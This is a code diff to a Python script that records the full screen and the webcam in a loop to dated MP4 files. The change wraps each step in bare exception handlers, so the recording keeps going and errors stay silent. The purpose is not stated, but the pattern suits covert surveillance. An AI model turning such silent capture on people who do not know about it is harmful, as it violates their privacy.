@@ -29,30 +29,36 @@ try:
     if not path.exists(output_path): makedirs(output_path)
 
     def record_loop():
-        start_time = int(time.time())
-        date = datetime.today().strftime('%Y-%m-%d')
-        
-        if not path.exists(f"{output_path}/{date}"): makedirs(f"{output_path}/{date}")
-        camera_output = f"{output_path}/{date}/camera_{start_time}.mp4"
-        video_output = f"{output_path}/{date}/screen_{start_time}.mp4"
-        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+        try:
+            start_time = int(time.time())
+            date = datetime.today().strftime('%Y-%m-%d')
+            
+            if not path.exists(f"{output_path}/{date}"): makedirs(f"{output_path}/{date}")
+            camera_output = f"{output_path}/{date}/camera_{start_time}.mp4"
+            video_output = f"{output_path}/{date}/screen_{start_time}.mp4"
+            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
 
-        screen_size = ImageGrab.grab().size
-        v["video_writer"] = cv2.VideoWriter(
-            video_output,
-            fourcc,
-            frame_rate,
-            screen_size
-        )
+            screen_size = ImageGrab.grab().size
+            v["video_writer"] = cv2.VideoWriter(
+                video_output,
+                fourcc,
+                frame_rate,
+                screen_size
+            )
+        except:
+            pass
 
-        v["camera"] = cv2.VideoCapture(0)
-        cam_size = (int(v["camera"].get(cv2.CAP_PROP_FRAME_WIDTH)), int(v["camera"].get(cv2.CAP_PROP_FRAME_HEIGHT)))
-        v["camera_writer"] = cv2.VideoWriter(
-            camera_output,
-            fourcc,
-            frame_rate,
-            cam_size
-        )
+        try:
+            v["camera"] = cv2.VideoCapture(0)
+            cam_size = (int(v["camera"].get(cv2.CAP_PROP_FRAME_WIDTH)), int(v["camera"].get(cv2.CAP_PROP_FRAME_HEIGHT)))
+            v["camera_writer"] = cv2.VideoWriter(
+                camera_output,
+                fourcc,
+                frame_rate,
+                cam_size
+            )
+        except:
+            pass
 
         try:
             while True:
@@ -62,15 +68,23 @@ try:
                     if path.exists(cleanup_path):
                         break
 
-                    v["video_writer"].write(cv2.cvtColor(
-                        np.array(
-                            ImageGrab.grab()
-                        ),
-                        cv2.COLOR_RGB2BGR
-                    ))
-                    v["camera_writer"].write(
-                        v["camera"].read()[1]
-                    )
+                    try:
+                        v["video_writer"].write(cv2.cvtColor(
+                            np.array(
+                                ImageGrab.grab()
+                            ),
+                            cv2.COLOR_RGB2BGR
+                        ))
+                    except:
+                        pass
+
+                    try:
+                        v["camera_writer"].write(
+                            v["camera"].read()[1]
+                        )
+                    except:
+                        pass
+
                     cv2.waitKey(1)
                 except:
                     pass
